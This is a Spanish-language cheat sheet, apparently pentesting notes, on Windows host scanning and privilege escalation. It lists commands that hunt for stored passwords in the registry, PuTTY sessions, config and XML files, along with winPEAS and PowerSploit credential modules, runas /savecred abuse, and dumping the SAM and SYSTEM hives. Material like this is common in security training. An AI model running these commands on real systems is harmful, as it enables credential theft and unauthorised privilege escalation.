
# Scanear Host desde Windows

```
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```
- Mil Gracias a DeepHacking del tito sikumy

# Formas tipicas de escalar privilegios para Windows

- WinPEAS
- PowerSploit
- Save Creds
- Sam y System
- Archivos de Configuracion
- Registro

# - Registro
```powershell
reg query HKLM /f password /t REG_SZ /s

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
Para contraseñas en Putty
```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```
# WinPEAS
```powershell
winPEAS.exe quiet filesinfo userinfo
winPEAS.exe quiet windowscreds
winPEAS.exe quiet searchfast filesinfo
```

# PowerSploit
Estos son sus modulos a probar
```powershell
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
``` 
# Credenciales Guardadas
```cmd
cmdkey /list
``` 
Runas --> en Caso de Tener credenciales guardadas de otro usuario podriamos ejecutar acciones o binarios
```powershell
runas /savecred /user:<usuario> <ejecutable> 
```

# Archivos de Configuracion
Buscando por archivos que contengan la palabra pass o extension .config
```cmd
dir /s *pass* == *.config
```
Buscando por archivos que contengan la palabra password y acaben por la extension .xml
```cmd
findstr /si password *.xml *.ini
```
- Modulo de Metasploit para buscar por password recursivamente
post/windows/gather/enum_unattend

# Sam y System
Los archivos SAM y SYSTEM, se almacenan en el directorio:
```cmd
C:\Windows\System32\config
```
Buscando por Backups de Sam y System
```cmd
C:\Windows\Repair
C:\Windows\System32\config\RegBack
```
Si los hubiesemos encontrado o tuviesemos privilegios para realizar una copia de los mismos
```
reg save HKLM\SAM SAM.backup
reg save HKLM\SYSTEM SYSTEM.backup
```
